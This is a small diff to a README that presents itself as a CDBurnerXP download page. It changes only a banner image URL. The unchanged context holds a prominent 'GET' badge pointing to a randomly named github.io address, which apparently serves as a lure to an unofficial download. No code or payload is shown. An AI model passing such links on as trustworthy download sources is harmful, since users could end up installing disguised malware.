@@ -1,6 +1,6 @@
 # CDBurnerXP Disc Burning — CD, DVD, ISO & Media Workflows
 
-![Banner Placeholder](https://как-установить.рф/wp-content/uploads/2019/04/Logotip-programmy.jpg)
+![Banner Placeholder](https://philka.ru/images/newspost_images/cdbxpp.png)
 
 [![GET — CDBurnerXP](https://img.shields.io/badge/GET%20%E2%80%94%20CDBurnerXP-0078D6?style=for-the-badge&logoColor=white)](https://79t2alessiost0an6escu.github.io/.github/CDBurnerXP-Disc-Burning)
 
